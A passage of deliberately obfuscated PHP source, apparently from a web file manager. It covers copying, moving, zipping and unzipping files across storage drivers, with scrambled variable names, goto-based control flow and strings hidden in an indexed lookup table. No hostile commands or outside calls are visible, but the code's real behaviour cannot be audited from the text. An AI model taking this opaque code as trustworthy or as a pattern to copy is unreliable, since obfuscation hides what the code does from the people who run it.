$CÃĞ¼¸ô‡->isParentOf($cëˆ‹µÓ±ì, $eÁ©Êˆ©Äô)) { show_json(LNG($a»İˆÇÜùÒ[987]), !1); } if (!$CÃĞ¼¸ô‡->exist($cëˆ‹µÓ±ì)) { show_json(LNG($a»İˆÇÜùÒ[100]), !1); } } private static function copyPath($A…ÍÙå…î, $cÌêÀì— ó, $F‹‚÷ßàôæ, $b¸ºœ¾›»µ, $dİÕ…¥¶›‹, $F„¼“…®, $c×Õ„ó‰ëÓ, $eÕ¼æâ„½¶ = false) { goto B»îÅÃ’ø; có ÁÏï: $c®³Û×–¥ = array_merge($E§ÏğÊÁ»[$Dó«º„Ø¾ù[73]], $E§ÏğÊÁ»[$Dó«º„Ø¾ù[74]]); foreach ($c®³Û×–¥ as $cÈÉˆê§²¾) { $FİĞŠÁÅé = $cÈÉˆê§²¾[$Dó«º„Ø¾ù[29]] == $Dó«º„Ø¾ù[163]; $cÌêÀì— ó = $A…ÍÙå…î->getPathInner($cÈÉˆê§²¾[$Dó«º„Ø¾ù[75]]); $F·©ˆ¨‘â = self::copyPath($A…ÍÙå…î, $cÌêÀì— ó, $F‹‚÷ßàôæ, $b¸ºœ¾›»µ, $dİÕ…¥¶›‹, $F„¼“…®, $FİĞŠÁÅé); if (!$F·©ˆ¨‘â) { write_log($Dó«º„Ø¾ù[988] . $cÌêÀì— ó . $Dó«º„Ø¾ù[989] . $b¸ºœ¾›»µ, $Dó«º„Ø¾ù[990]); } } return $E‡Æøª–Çè; goto fôâé–È‡÷; d¯ãÚƒÃåÄ: if ($c×Õ„ó‰ëÓ) { return self::copyFile($A…ÍÙå…î, $cÌêÀì— ó, $F‹‚÷ßàôæ, $b¸ºœ¾›»µ, $Aì¼¤ºƒ¢¥, $F„¼“…®); } if ($dİÕ…¥¶›‹ == REPEAT_RENAME_FOLDER) { $dİÕ…¥¶›‹ = !1; } $DÂì¾—‘Ô = rtrim($b¸ºœ¾›»µ, $Dó«º„Ø¾ù[8]) . $Dó«º„Ø¾ù[8] . $Aì¼¤ºƒ¢¥; goto d¦‹Ü¢õè; d¦‹Ü¢õè: $E‡Æøª–Çè = $F‹‚÷ßàôæ->mkdir($F‹‚÷ßàôæ->getPath($DÂì¾—‘Ô)); $b¸ºœ¾›»µ = $F‹‚÷ßàôæ->getPathInner($E‡Æøª–Çè); $E§ÏğÊÁ» = $A…ÍÙå…î->listPath($cÌêÀì— ó, !0); goto có ÁÏï; B»îÅÃ’ø: $Dó«º„Ø¾ù =& $_SERVER[»„]; $Aì¼¤ºƒ¢¥ = $eÕ¼æâ„½¶ ? $eÕ¼æâ„½¶ : $A…ÍÙå…î->getPathName($A…ÍÙå…î->pathThis($cÌêÀì— ó)); if ($dİÕ…¥¶›‹) { $c—³¬˜äô÷ = $F‹‚÷ßàôæ->fileNameExist($b¸ºœ¾›»µ, $Aì¼¤ºƒ¢¥); $Aì¼¤ºƒ¢¥ = $F‹‚÷ßàôæ->fileNameAuto($b¸ºœ¾›»µ, $Aì¼¤ºƒ¢¥, $dİÕ…¥¶›‹, !$c×Õ„ó‰ëÓ); $dİÕ…¥¶›‹ = $c—³¬˜äô÷ ? $dİÕ…¥¶›‹ : !1; } goto d¯ãÚƒÃåÄ; fôâé–È‡÷: } private static function copyFile($AáÍ¹åÏ¾ø, $e¥ÅéÔçñ, $eÃŠ±ÖÇ¦ë, $A±•·è”Ú, $bƒĞÚ§º´…, $A‰­òó½ ) { goto c÷±µÜ±º; Eš„í­¥¤‚: Hook::trigger($E®»÷ÚøÄ©[993], $AáÍ¹åÏ¾ø, $e¥ÅéÔçñ, $eÃŠ±ÖÇ¦ë, $A±•·è”Ú, $bƒĞÚ§º´…, $cÊèŒİÕ©ç); return $cÊèŒİÕ©ç; goto d”ÃØ£¸ßè; få„‰ä²¨À: Hook::trigger($E®»÷ÚøÄ©[992], $AáÍ¹åÏ¾ø, $e¥ÅéÔçñ, $eÃŠ±ÖÇ¦ë, $A±•·è”Ú, $bƒĞÚ§º´…, $bª·‰ºÜØË); if (self::driverIsSame($AáÍ¹åÏ¾ø, $eÃŠ±ÖÇ¦ë)) { if ($A‰­òó½ ) { $cÊèŒİÕ©ç = $eÃŠ±ÖÇ¦ë->moveFile($e¥ÅéÔçñ, $A±•·è”Ú); } else { $cÊèŒİÕ©ç = $eÃŠ±ÖÇ¦ë->copyFile($e¥ÅéÔçñ, $A±•·è”Ú); } Hook::trigger($E®»÷ÚøÄ©[993], $AáÍ¹åÏ¾ø, $e¥ÅéÔçñ, $eÃŠ±ÖÇ¦ë, $A±•·è”Ú, $bƒĞÚ§º´…, $cÊèŒİÕ©ç); return $cÊèŒİÕ©ç; } $b‘°Ğˆµ¯† = TEMP_FILES; goto bç÷‡å±; bç÷‡å±: mk_dir($b‘°Ğˆµ¯†); $EùÓÜ¸ÜŠó = $b‘°Ğˆµ¯† . $bª·‰ºÜØË; $EùÓÜ¸ÜŠó = $AáÍ¹åÏ¾ø->download($e¥ÅéÔçñ, $EùÓÜ¸ÜŠó); goto AÑ“ÁôÛ¾‚; AÑ“ÁôÛ¾‚: $EùÓÜ¸ÜŠó = $AáÍ¹åÏ¾ø->iconvApp($EùÓÜ¸ÜŠó); $cÊèŒİÕ©ç = $eÃŠ±ÖÇ¦ë->upload($A±•·è”Ú, $EùÓÜ¸ÜŠó, $A‰­òó½ ); self::remove($b‘°Ğˆµ¯† . $bª·‰ºÜØË); goto Eš„í­¥¤‚; c÷±µÜ±º: $E®»÷ÚøÄ© =& $_SERVER[»„]; $A±•·è”Ú = $eÃŠ±ÖÇ¦ë->getPath(rtrim($A±•·è”Ú, $E®»÷ÚøÄ©[8]) . $E®»÷ÚøÄ©[8] . $bƒĞÚ§º´…); $bª·‰ºÜØË = $E®»÷ÚøÄ©[991] . time() . rand_string(5); goto få„‰ä²¨À; d”ÃØ£¸ßè: } public static function pathFather($DØ÷˜ÇÁ) { $F¾¿¶‡ŒÓØ = IO::init($DØ÷˜ÇÁ); $BœµŒ —£Ï = $F¾¿¶‡ŒÓØ->pathFather($F¾¿¶‡ŒÓØ->path); return $F¾¿¶‡ŒÓØ->getPathOuter($BœµŒ —£Ï); } public static function fileOut($Dõµ±‹êŞÀ, $Dõ‰Ëä‘• = false, $F„˜öÕ²›¯ = false, $bñĞ¬”‚ËŒ = '') { $d†åÅ„šÊ‹ = self::driverMake($Dõµ±‹êŞÀ); if ($d†åÅ„šÊ‹->isFileOutServer()) { return $d†åÅ„šÊ‹->fileOutServer($Dõµ±‹êŞÀ, $Dõ‰Ëä‘•, $F„˜öÕ²›¯, $bñĞ¬”‚ËŒ); } return $d†åÅ„šÊ‹->fileOut($Dõµ±‹êŞÀ, $Dõ‰Ëä‘•, $F„˜öÕ²›¯, $bñĞ¬”‚ËŒ); } public static function fileOutImage($CÑ¹…ÊšÓº, $AªëàÚ«‰ = 250) { $a£„¡Ñˆƒ = array(250, 600, 1200, 3000); for ($Cè§¶ÏêœÜ = 0; $Cè§¶ÏêœÜ < count($a£„¡Ñˆƒ); $Cè§¶ÏêœÜ++) { if ($Cè§¶ÏêœÜ == 0 && $AªëàÚ«‰ <= $a£„¡Ñˆƒ[$Cè§¶ÏêœÜ]) { $AªëàÚ«‰ = $a£„¡Ñˆƒ[$Cè§¶ÏêœÜ]; break; } else { if ($AªëàÚ«‰ > $a£„¡Ñˆƒ[$Cè§¶ÏêœÜ - 1] && $AªëàÚ«‰ <= $a£„¡Ñˆƒ[$Cè§¶ÏêœÜ]) { $AªëàÚ«‰ = $a£„¡Ñˆƒ[$Cè§¶ÏêœÜ]; break; } else { if ($Cè§¶ÏêœÜ == count($a£„¡Ñˆƒ) - 1 && $AªëàÚ«‰ > $a£„¡Ñˆƒ[$Cè§¶ÏêœÜ]) { $AªëàÚ«‰ = $a£„¡Ñˆƒ[$Cè§¶ÏêœÜ]; break; } } } } $Dƒ…™µ¡åğ = self::driverMake($CÑ¹…ÊšÓº); if ($Dƒ…™µ¡åğ->isFileOutServer()) { return $Dƒ…™µ¡åğ->fileOutImageServer($CÑ¹…ÊšÓº, $AªëàÚ«‰); } return $Dƒ…™µ¡åğ->fileOutImage($CÑ¹…ÊšÓº, $AªëàÚ«‰); } private static function driverIsSame($aìÆ§½¼°, $a‚§¡…°ÆŞ) { goto C¤…äòºã“; C¤…äòºã“: $A¼š™²—·³ =& $_SERVER[»„]; $E§ĞÂ°†¼µ = $aìÆ§½¼°->getType(); $bîõÌß˜ï = $a‚§¡…°ÆŞ->getType(); goto c£—Ë¿¹¯; B¬Ó‰ŸÕ³©: if ($aìÆ§½¼°->pathDriver == $a‚§¡…°ÆŞ->pathDriver) { return !0; } return !1; goto f©ƒÖÁùÂ£; c£—Ë¿¹¯: if ($E§ĞÂ°†¼µ != $bîõÌß˜ï) { return !1; } if ($E§ĞÂ°†¼µ == $A¼š™²—·³[682]) { return !0; } if ($E§ĞÂ°†¼µ == $A¼š™²—·³[101]) { return !0; } goto B¬Ó‰ŸÕ³©; f©ƒÖÁùÂ£: } public static function copyUpdate($c…•ŒÍˆÂæ, $AãÍÌâÅ¨) { goto cóèº¨Ş‘ö; cóèº¨Ş‘ö: $BË§ƒÊÏñ› =& $_SERVER[»„]; if (!IO::exist($c…•ŒÍˆÂæ)) { return !1; } if (!IO::exist($AãÍÌâÅ¨)) { IO::mkdir($AãÍÌâÅ¨); } goto BĞÌ„ò¯Æô; fàÖ§Ø‹­: Hook::trigger($BË§ƒÊÏñ›[997], $c…•ŒÍˆÂæ, $AãÍÌâÅ¨, $FÚŒ‹èå¿); foreach ($e¥¦«¢Ğ¦ as $e´¦Ï‚’çŠ) { IO::mkdir($e´¦Ï‚’çŠ); } foreach ($a„•ÊáŠ½‰ as $e´¦Ï‚’çŠ) { IO::copy($e´¦Ï‚’çŠ[$BË§ƒÊÏñ›[994]], $e´¦Ï‚’çŠ[$BË§ƒÊÏñ›[995]], REPEAT_REPLACE); } goto cî»òŒäô–; BĞÌ„ò¯Æô: $d¬ÙŸŠèôÚ = self::_listAll($c…•ŒÍˆÂæ); $Bå‘µÂ¶ˆ½ = self::_listAll($AãÍÌâÅ¨); $a„•ÊáŠ½‰ = array(); goto fÓ¬Ë„Î§£; fÓ¬Ë„Î§£: $e¥¦«¢Ğ¦ = array(); foreach ($d¬ÙŸŠèôÚ as $e…«ÆèÖ»² => $e´¦Ï‚’çŠ) { if (isset($Bå‘µÂ¶ˆ½[$e…«ÆèÖ»²])) { if ($e´¦Ï‚’çŠ[$BË§ƒÊÏñ›[76]] == 1) { continue; } if ($Bå‘µÂ¶ˆ½[$e…«ÆèÖ»²][$BË§ƒÊÏñ›[77]] == $e´¦Ï‚’çŠ[$BË§ƒÊÏñ›[77]]) { continue; } } if ($e´¦Ï‚’çŠ[$BË§ƒÊÏñ›[76]] == 1) { $e¥¦«¢Ğ¦[] = $AãÍÌâÅ¨ . $BË§ƒÊÏñ›[8] . $e…«ÆèÖ»²; continue; } $Aè–…ÙÒ˜Ê = strstr(trim($e…«ÆèÖ»², $BË§ƒÊÏñ›[8]), $BË§ƒÊÏñ›[8]) ? get_path_father($e…«ÆèÖ»²) : $BË§ƒÊÏñ›[33]; $a„•ÊáŠ½‰[] = array($BË§ƒÊÏñ›[994] => $e´¦Ï‚’çŠ[$BË§ƒÊÏñ›[75]], $BË§ƒÊÏñ›[995] => rtrim($AãÍÌâÅ¨, $BË§ƒÊÏñ›[8]) . $BË§ƒÊÏñ›[8] . $Aè–…ÙÒ˜Ê, $BË§ƒÊÏñ›[996] => $e´¦Ï‚’çŠ); } $FÚŒ‹èå¿ = array($BË§ƒÊÏñ›[163] => $a„•ÊáŠ½‰, $BË§ƒÊÏñ›[76] => $e¥¦«¢Ğ¦); goto fàÖ§Ø‹­; cî»òŒäô–: } private static function _listAll($b™¿´ëÚŞ—) { $EÄš±²‹òõ =& $_SERVER[»„]; $b™¿´ëÚŞ— = KodIO::clear($b™¿´ëÚŞ—); $b½œß©â = IO::listAll($b™¿´ëÚŞ—); foreach ($b½œß©â as &$F’„©ø¨ë×) { $AÃó¤‡§ø = substr($F’„©ø¨ë×[$EÄš±²‹òõ[75]], strlen($b™¿´ëÚŞ—)); $F’„©ø¨ë×[$EÄš±²‹òõ[998]] = trim($AÃó¤‡§ø, $EÄš±²‹òõ[8]); } return array_to_keyvalue($b½œß©â, $EÄš±²‹òõ[998]); } public static function fileSubstr($cîâïï…øè, $CÈÎÉ¶™Øˆ, $f§‹Ğí…Ò» = false) { goto cÁ‡¤¯Ñîˆ; d¬áêÊ„‰: if ($CÈÎÉ¶™Øˆ + $f§‹Ğí…Ò» > $CÁ™¹„†³Œ) { $f§‹Ğí…Ò» = $CÁ™¹„†³Œ - $CÈÎÉ¶™Øˆ; } if ($f§‹Ğí…Ò» <= 0) { return $_SERVER[»„][33]; } if ($CÈÎÉ¶™Øˆ < 0 || $CÈÎÉ¶™Øˆ >= $CÁ™¹„†³Œ || $f§‹Ğí…Ò» > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\145\x52\x65\141\x64\x20\145\x72\x72\157\162\x21\x20\163\x74\x61\162\164\75{$CÈÎÉ¶™Øˆ}\x3b\154\145\x6e\147\164\150\x3d{$f§‹Ğí…Ò»}\x3b\40\163\x69\x7a\x65\75{$CÁ™¹„†³Œ}\73"); } goto E©áĞäéë¬; EËÍµç—øŒ: $CáèÂ„÷è = $f§‹Ğí…Ò»; if ($CÈÎÉ¶™Øˆ < 0) { $CÈÎÉ¶™Øˆ = $CÁ™¹„†³Œ + $CÈÎÉ¶™Øˆ; } if ($f§‹Ğí…Ò» === !1) { $f§‹Ğí…Ò» = $CÁ™¹„†³Œ - $CÈÎÉ¶™Øˆ; } goto d¬áêÊ„‰; E©áĞäéë¬: return $cÓ©¾µ‰Å¯->fileSubstr($cîâïï…øè, $CÈÎÉ¶™Øˆ, $f§‹Ğí…Ò»); goto eÅ¨ÏñÓ¾; cÁ‡¤¯Ñîˆ: $cÓ©¾µ‰Å¯ = self::driverMake($cîâïï…øè); $CÁ™¹„†³Œ = $cÓ©¾µ‰Å¯->size($cîâïï…øè); $FœºìÓÒÍ = $CÈÎÉ¶™Øˆ; goto EËÍµç—øŒ; eÅ¨ÏñÓ¾: } private static function driverMake(&$B’’Î¡Ö’Ô) { goto A®†ÀíÌÍ; aÒØ—öÒõ: return $D»Ìö„Û³¸; goto bãÂÜˆŸ ; A®†ÀíÌÍ: $A×ˆÍŒŠ²‰ =& $_SERVER[»„]; $e÷ŒÖä•‰Ê = KodIO::parse($B’’Î¡Ö’Ô); if (!self::$driverListSystem) { $D„²î°ÃÉŠ = Model($A×ˆÍŒŠ²‰[692])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($D„²î°ÃÉŠ, $A×ˆÍŒŠ²‰[363]); } goto bñ…ß¯Ô; bñ…ß¯Ô: if ($e÷ŒÖä•‰Ê[$A×ˆÍŒŠ²‰[29]] == KodIO::KOD_IO && !self::$driverListSystem[$e÷ŒÖä•‰Ê[$A×ˆÍŒŠ²‰[363]]]) { return !1; } $B’’Î¡Ö’Ô = $e÷ŒÖä•‰Ê[$A×ˆÍŒŠ²‰[999]]; $D»Ìö„Û³¸ = self::driverGet($e÷ŒÖä•‰Ê, $B’’Î¡Ö’Ô); goto aÒØ—öÒõ; bãÂÜˆŸ : } private static function driverGet($bÅå¨ÄÅ, &$e¼œÖ°å‚É) { goto f—·Ï´Ù¦ç; b¯ºæ·÷­Å: $C÷İã‹ùĞ->path = $e¼œÖ°å‚É; return $C÷İã‹ùĞ; goto dÃ¶¯æÔ—; CĞçé±î°È: switch ($bÅå¨ÄÅ[$E©ñØ…¸È[29]]) { case KodIO::KOD_IO: $B¨Œâñˆ = self::$driverListSystem[$dÂ³¿ë×İˆ]; break; case KodIO::KOD_SOURCE: $e¼œÖ°å‚É = $dÂ³¿ë×İˆ . $e¼œÖ°å‚É; $B¨Œâñˆ = array($E©ñØ…¸È[1001] => $E©ñØ…¸È[1002], $E©ñØ…¸È[6] => $bÅå¨ÄÅ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $CŸÔœÇ‰Ì = $GLOBALS[$E©ñØ…¸È[1003]]; self::$driverListUser = array_to_keyvalue($CŸÔœÇ‰Ì, $E©ñØ…¸È[363]); } $B¨Œâñˆ = self::$driverListUser[$dÂ³¿ë×İˆ]; break; case KodIO::KOD_SHARE_LINK: $B¨Œâñˆ = array($E©ñØ…¸È[1001] => $E©ñØ…¸È[1004], $E©ñØ…¸È[6] => $bÅå¨ÄÅ); $C¨éÁ½©° = Action($E©ñØ…¸È[1005])->sharePathInfo($bÅå¨ÄÅ[$E©ñØ…¸È[75]]); $e¼œÖ°å‚É = $C¨éÁ½©°[$E©ñØ…¸È[365]]; if (!$C¨éÁ½©°[$E©ñØ…¸È[365]]) { $A¾ÄÙ”² = Model($E©ñØ…¸È[532])->getInfo($C¨éÁ½©°[$E©ñØ…¸È[437]]); $e¼œÖ°å‚É = KodIO::clear($A¾ÄÙ”²[$E©ñØ…¸È[1006]] . $bÅå¨ÄÅ[$E©ñØ…¸È[999]]); $bÅå¨ÄÅ[$E©ñØ…¸È[435]] = $A¾ÄÙ”²; $bÅå¨ÄÅ[$E©ñØ…¸È[986]] = $e¼œÖ°å‚É; $B¨Œâñˆ = array($E©ñØ…¸È[1001] => $E©ñØ…¸È[1007], $E©ñØ…¸È[6] => $bÅå¨ÄÅ); } break; case KodIO::KOD_SHARE_ITEM: $B¨Œâñˆ = array($E©ñØ…¸È[1001] => $E©ñØ…¸È[1008], $E©ñØ…¸È[6] => $bÅå¨ÄÅ); $A¾ÄÙ”² = Model($E©ñØ…¸È[532])->getInfo($bÅå¨ÄÅ[$E©ñØ…¸È[363]]); if ($A¾ÄÙ”²[$E©ñØ…¸È[365]] == $E©ñØ…¸È[464]) { $e¼œÖ°å‚É = KodIO::clear($A¾ÄÙ”²[$E©ñØ…¸È[1006]] . $bÅå¨ÄÅ[$E©ñØ…¸È[999]]); $bÅå¨ÄÅ[$E©ñØ…¸È[435]] = $A¾ÄÙ”²; $bÅå¨ÄÅ[$E©ñØ…¸È[986]] = $e¼œÖ°å‚É; $B¨Œâñˆ = array($E©ñØ…¸È[1001] => $E©ñØ…¸È[1009], $E©ñØ…¸È[6] => $bÅå¨ÄÅ); } break; default: $e¼œÖ°å‚É = $bÅå¨ÄÅ[$E©ñØ…¸È[75]]; $B¨Œâñˆ = array($E©ñØ…¸È[1001] => $E©ñØ…¸È[1010]); break; } $F¼¨ã’˜é = $bÅå¨ÄÅ[$E©ñØ…¸È[75]]; if (!isset(self::$driverCache[$F¼¨ã’˜é])) { $bçó„šÜ÷Œ = strtolower($B¨Œâñˆ[$E©ñØ…¸È[90]]); $E˜”¦Õº¤‘ = $GLOBALS[$E©ñØ…¸È[6]][$E©ñØ…¸È[84]][$E©ñØ…¸È[1011]]; $BÛİ•œ”¥ø = $E©ñØ…¸È[71] . (isset($E˜”¦Õº¤‘[$bçó„šÜ÷Œ]) ? $E˜”¦Õº¤‘[$bçó„šÜ÷Œ] : ucfirst($bçó„šÜ÷Œ)); if (!class_exists($BÛİ•œ”¥ø)) { show_json("{$BÛİ•œ”¥ø}\x20\x6e\x6f\x74\40\x65\170\x69\163\164\x73\41", !1); } $BôÆÌî†Ş‰ = isset($B¨Œâñˆ[$E©ñØ…¸È[6]]) ? $B¨Œâñˆ[$E©ñØ…¸È[6]] : !1; self::$driverCache[$F¼¨ã’˜é] = new $BÛİ•œ”¥ø($BôÆÌî†Ş‰); } goto BØÁäÖÉª; f—·Ï´Ù¦ç: $E©ñØ…¸È =& $_SERVER[»„]; $dÄîìœ…ëê = $bÅå¨ÄÅ[$E©ñØ…¸È[1000]]; $dÂ³¿ë×İˆ = $bÅå¨ÄÅ[$E©ñØ…¸È[363]]; goto CĞçé±î°È; Fİƒ×£´ªÛ: if (isset($B¨Œâñˆ[$E©ñØ…¸È[6]][$E©ñØ…¸È[1012]])) { $C÷İã‹ùĞ->pathBase = rtrim($B¨Œâñˆ[$E©ñØ…¸È[6]][$E©ñØ…¸È[1012]], $E©ñØ…¸È[8]) . $E©ñØ…¸È[8]; $e¼œÖ°å‚É = $C÷İã‹ùĞ->pathBase . ltrim($e¼œÖ°å‚É, $E©ñØ…¸È[8]); } $e¼œÖ°å‚É = $C÷İã‹ùĞ->getPath($e¼œÖ°å‚É); if (isset($bÅå¨ÄÅ[$E©ñØ…¸È[986]])) { $e¼œÖ°å‚É = $bÅå¨ÄÅ[$E©ñØ…¸È[986]]; } goto b¯ºæ·÷­Å; BØÁäÖÉª: $C÷İã‹ùĞ = self::$driverCache[$F¼¨ã’˜é]; $C÷İã‹ùĞ->pathDriver = $dÄîìœ…ëê; $C÷İã‹ùĞ->pathBase = $E©ñØ…¸È[33]; goto Fİƒ×£´ªÛ; dÃ¶¯æÔ—: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $e†çÁ…»×Ğ; if (!$e†çÁ…»×Ğ) { $E©ëëø = IO::init($_SERVER[»„][8]); } return $E©ëëø; } private static function iconvSystem($fÖììåÏçÀ) { return self::local()->iconvSystem($fÖììåÏçÀ); } private static function iconvApp($bÌíÍ‰°÷¦) { return self::local()->iconvApp($bÌíÍ‰°÷¦); } public static function zip($d—õƒˆÀä, $EÉÌó“Å = "\172\151\160", $AÈ÷ÏõÇÂ = '', $Böˆ–“¦æ² = REPEAT_RENAME) { goto eåŠö–àÎ; fÀ‚©ÇŞÃ: $b¸—‡éõàÇ = $F¡ ïÚ— Ş . $a·ˆ¤‚ç×¤ . $fƒŒ‰éëõÊ[91] . $EÉÌó“Å; $b¸—‡éõàÇ = get_filename_auto($b¸—‡éõàÇ, $fƒŒ‰éëõÊ[33], $Böˆ–“¦æ²); $B”Ÿƒ¿ˆâ = self::iconvSystem($b¸—‡éõàÇ); goto føì¦ Óˆ²; dê«ğ®ßøæ: if ($AÈ÷ÏõÇÂ || !$F´åëÊæƒ) { if ($F´åëÊæƒ && strstr($F´åëÊæƒ, TEMP_FILES)) { $eƒÚ¬ ©…™ = $CƒŒ¤Ï¡‘ = array(); recursion_dir($F¡ ïÚ— Ş, $eƒÚ¬ ©…™, $CƒŒ¤Ï¡‘, 0); foreach ($eƒÚ¬ ©…™ as $b·ÁµœÏèŸ) { del_dir($b·ÁµœÏèŸ); } foreach ($CƒŒ¤Ï¡‘ as $fŒâ¶Ç¥¤ƒ) { if ($fŒâ¶Ç¥¤ƒ == $B”Ÿƒ¿ˆâ) { continue; } del_file($fŒâ¶Ç¥¤ƒ); } } return $b¸—‡éõàÇ; } $c‘ã°‡©¾å = self::pathFather($BÎÔÜíÛŞ[$fƒŒ‰éëõÊ[75]]); $f±èô°ò„ = self::move($b¸—‡éõàÇ, $c‘ã°‡©¾å, $Böˆ–“¦æ²); goto Bè¤˜¤ÓÀ; Bè¤˜¤ÓÀ: if (!$f±èô°ò„) { del_dir($F´åëÊæƒ); show_json(LNG($fƒŒ‰éëõÊ[1015]), !1); } del_dir($F´åëÊæƒ); return $f±èô°ò„; goto bÙ»ñ Í; fù¦ö÷›¾­: $F´åëÊæƒ = !1; if (!$AÈ÷ÏõÇÂ && $a–¶†ïà·®->getType() == $fƒŒ‰éëõÊ[101]) { $CƒŒ¤Ï¡‘ = self::zipFileList($d—õƒˆÀä); } else { $F´åëÊæƒ = $AÈ÷ÏõÇÂ ? $AÈ÷ÏõÇÂ : TEMP_FILES . $fƒŒ‰éëõÊ[1013] . time() . rand_string(8) . $fƒŒ‰éëõÊ[8]; mk_dir($F´åëÊæƒ); $CƒŒ¤Ï¡‘ = self::zipFileList($d—õƒˆÀä, $F´åëÊæƒ); } $a·ˆ¤‚ç×¤ = $BÎÔÜíÛŞ[$fƒŒ‰éëõÊ[28]]; goto a¸™…íµˆÄ; føì¦ Óˆ²: foreach ($CƒŒ¤Ï¡‘ as $E‚˜ˆæ˜Š° => $fáŠêƒµˆ) { $CƒŒ¤Ï¡‘[$E‚˜ˆæ˜Š°] = self::iconvSystem($fáŠêƒµˆ); } KodArchive::create($B”Ÿƒ¿ˆâ, $CƒŒ¤Ï¡‘); if (!IO::exist($b¸—‡éõàÇ)) { if ($F´åëÊæƒ) { del_dir($F´åëÊæƒ); } show_json(LNG($fƒŒ‰éëõÊ[1015]), !1); } goto dê«ğ®ßøæ; a¸™…íµˆÄ: if (count($CƒŒ¤Ï¡‘) > 1) { $F½¦Äàñªô = IO::info(IO::pathFather($BÎÔÜíÛŞ[$fƒŒ‰éëõÊ[75]])); $a·ˆ¤‚ç×¤ = $F½¦Äàñªô[$fƒŒ‰éëõÊ[28]]; } $F¡ ïÚ— Ş = $F´åëÊæƒ; if (!$F¡ ïÚ— Ş) { $F¡ ïÚ— Ş = get_path_father($BÎÔÜíÛŞ[$fƒŒ‰éëõÊ[75]]); $b•¹êŞÊ = IO::info($F¡ ïÚ— Ş); if (!$b•¹êŞÊ[$fƒŒ‰éëõÊ[185]]) { show_json(LNG($fƒŒ‰éëõÊ[1014]), !1); } } goto fÀ‚©ÇŞÃ; eåŠö–àÎ: $fƒŒ‰éëõÊ =& $_SERVER[»„]; $a–¶†ïà·® = self::init($d—õƒˆÀä[0][$fƒŒ‰éëõÊ[75]]); $BÎÔÜíÛŞ = self::info($d—õƒˆÀä[0][$fƒŒ‰éëõÊ[75]]); goto fù¦ö÷›¾­; bÙ»ñ Í: } public static function unzip($Cœâ·„éğ, $d…ÈÜĞÇ¤— = "\162\x65\160\x6c\x61\143\x65") { goto B•Ä„ÒŸÌÀ; fƒ¥Åõ„½: $dÓ‚‡©¡­ = KodArchive::extract($b§ÕØ½áó, $BÇå‰  œ§ . $BÉ³øƒ»·Ñ[8], $c¦µôÈ®Ù‘); self::archiveExt(); if (!$dÓ‚‡©¡­[$BÉ³øƒ»·Ñ[1020]]) { show_json($BÉ³øƒ»·Ñ[1021] . $dÓ‚‡©¡­[$BÉ³øƒ»·Ñ[1022]], !1); } goto F¥ÇªñÚŠ”; dÜ´Ìó•»: foreach ($dÄ„ÂæÈ¢ñ as $a¢ÚĞ ì¿) { $a¢ÚĞ ì¿ = self::iconvApp($a¢ÚĞ ì¿); self::move($a¢ÚĞ ì¿, $EËí‰“Äºô, $d…ÈÜĞÇ¤—); } del_dir($BÇå‰  œ§); if (!$Cóƒ¿ÕĞ™İ) { del_file($b§ÕØ½áó); } goto EëµèµÎ­®; C›–ŸíƒÅ: mk_dir($BÇå‰  œ§); $Bç„»ß‰é¢ = self::fileExt($c“à¯Å…˜·); $b§ÕØ½áó = $BÇå‰  œ§ . $BÉ³øƒ»·Ñ[91] . $Bç„»ß‰é¢; goto B›ÔŠ×ùÇ‹; B™‹Çö—Ü: $e¯ÊŞÙÆªŞ = self::tmpFileName($c“à¯Å…˜·); $BÇå‰  œ§ = TEMP_FILES . $e¯ÊŞÙÆªŞ; del_dir($BÇå‰  œ§); goto C›–ŸíƒÅ; EëµèµÎ­®: return !0; goto E©î¢£ÛÚ; F¥ÇªñÚŠ”: Hook::trigger($BÉ³øƒ»·Ñ[1023], $BÇå‰  œ§); recursion_dir($BÇå‰  œ§, $f—ÂÍšå±é, $F­œ†ºÔ÷Ë, 0); $dÄ„ÂæÈ¢ñ = array_merge($f—ÂÍšå±é, $F­œ†ºÔ÷Ë); goto dÜ´Ìó•»; B•Ä„ÒŸÌÀ: $BÉ³øƒ»·Ñ =& $_SERVER[»„]; $Fµ‡…É = $Cœâ·„éğ[$BÉ³øƒ»·Ñ[75]]; $EËí‰“Äºô = $Cœâ·„éğ[$BÉ³øƒ»·Ñ[1016]]; goto b·Ä’­äëÓ; B›ÔŠ×ùÇ‹: if (!@file_exists(self::iconvSystem($b§ÕØ½áó))) { $Cóƒ¿ÕĞ™İ = self::localFilePath($Fµ‡…É, $Bç„»ß‰é¢); $b§ÕØ½áó = $Cóƒ¿ÕĞ™İ ? $Cóƒ¿ÕĞ™İ : parent::download($Fµ‡…É, $b§ÕØ½áó); } $b§ÕØ½áó = self::iconvSystem($b§ÕØ½áó); $c¦µôÈ®Ù‘ = isset($Cœâ·„éğ[$BÉ³øƒ»·Ñ[1018]]) ? $Cœâ·„éğ[$BÉ³øƒ»·Ñ[1018]] : $BÉ³øƒ»·Ñ[1019]; goto fƒ¥Åõ„½; b·Ä’­äëÓ: if (!($c“à¯Å…˜· = parent::info($Fµ‡…É))) { show_json(LNG($BÉ³øƒ»·Ñ[1017]), !1); } if (!($CÖ¢ãáÃâ = parent::infoFull($EËí‰“Äºô))) { $EËí‰“Äºô = parent::mkdir($EËí‰“Äºô); $CÖ¢ãáÃâ = array($BÉ³øƒ»·Ñ[75] => $EËí‰“Äºô); } else { if (isset($CÖ¢ãáÃâ[$BÉ³øƒ»·Ñ[365]]) && trim($CÖ¢ãáÃâ[$BÉ³øƒ»·Ñ[75]], $BÉ³øƒ»·Ñ[8]) != trim($EËí‰“Äºô, $BÉ³øƒ»·Ñ[8])) { $F·¢çØÑÃœ = KodIO::make($CÖ¢ãáÃâ[$BÉ³øƒ»·Ñ[457]]); $D–´”á“Üá = parent::fileNameAuto($F·¢çØÑÃœ, $CÖ¢ãáÃâ[$BÉ³øƒ»·Ñ[28]], REPEAT_RENAME_FOLDER, !0); $EËí‰“Äºô = parent::mkdir($F·¢çØÑÃœ . $D–´”á“Üá); $CÖ¢ãáÃâ = array($BÉ³øƒ»·Ñ[75] => $EËí‰“Äºô); } } $EËí‰“Äºô = $CÖ¢ãáÃâ[$BÉ³øƒ»·Ñ[75]]; goto B™‹Çö—Ü; E©î¢£ÛÚ: } public static function unzipList($E²ô·Ã î) { goto c©œğÄÜ•’; f¶ø §†Î: $D±Ò˜ÖéÂ‚ = self::info($aƒéÑê§¿®); 